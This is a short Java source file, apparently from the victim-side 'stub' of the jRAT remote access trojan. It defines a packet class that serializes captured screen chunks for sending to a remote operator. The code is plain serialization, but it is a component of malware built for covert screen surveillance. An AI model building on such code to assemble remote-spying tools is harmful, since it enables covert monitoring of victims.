package se.jrat.stub.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.common.io.StringWriter;

public class Packet26RemoteScreen extends AbstractOutgoingPacket {

	private int chunkWidth;
	private int chunkHeight;
	private int x;
	private int y;
	private int width;
	private int height;
	private byte[] buffer;

	public Packet26RemoteScreen(int w, int h, int x, int y, int width, int height, byte[] buffer) {
		this.chunkWidth = w;
		this.chunkHeight = h;
		this.x = x;
		this.y = y;
		this.width = width;
		this.height = height;
		this.buffer = buffer;
	}

	@Override
	public void write(DataOutputStream dos, StringWriter sw) throws Exception {
		dos.writeInt(chunkWidth);
		dos.writeInt(chunkHeight);
		dos.writeInt(x);
		dos.writeInt(y);
		dos.writeInt(width);
		dos.writeInt(height);

		dos.writeInt(buffer.length);
		dos.write(buffer);
	}

	@Override
	public byte getPacketId() {
		return 26;
	}

}
